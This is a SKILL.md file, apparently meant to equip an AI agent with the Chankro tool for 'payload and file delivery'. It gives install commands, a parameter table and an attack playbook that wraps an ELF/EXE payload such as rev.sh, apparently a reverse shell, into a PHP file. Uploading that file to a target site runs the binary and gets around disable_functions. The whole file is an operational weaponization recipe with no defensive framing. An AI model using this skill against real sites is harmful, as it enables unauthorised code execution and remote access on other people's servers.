---
name: chankro-php-binary
description: "Chankro: Delivers ELF/EXE payloads through PHP environments. Signals: payload development, weaponization, binary delivery via PHP, Windows payloads, specified PHP interpreter path."
zh-signals: "Chankro: PHP 环境投递 ELF/EXE。信号:载荷开发,武器化,生成二进制投递 PHP,Windows 载荷,指定 PHP 解释器路径。"
when-to-use: >-
  Use when you can upload PHP but need to execute ELF/EXE binaries on a target
  with disable_functions, generating a PHP wrapper that runs the payload.
---

# Chankro

- Attack Category: C07 Payload and File Delivery
- Upstream Repository: https://github.com/TarlogicSecurity/Chankro
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/TarlogicSecurity/Chankro && cd Chankro && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python chankro.py -a x64 -m linux -p /tmp/payload.sh -o chan.php` | Generate a PHP binary delivery wrapper |
| `-a x64 -m win -p payload.exe -o up.php` | Windows payload |
| `-e /usr/bin/php` | Specified PHP interpreter path |

## Attack Scenario Playbook

### Delivering ELF/EXE in a PHP environment

```bash
python chankro.py -a x64 -m linux -p rev.sh -o uploader.php
# Upload it to the target site; visiting the page executes the binary on the target
```

## Notes

By Tarlogic; bypasses disable_functions by stuffing the binary payload into a PHP file for upload-based execution.
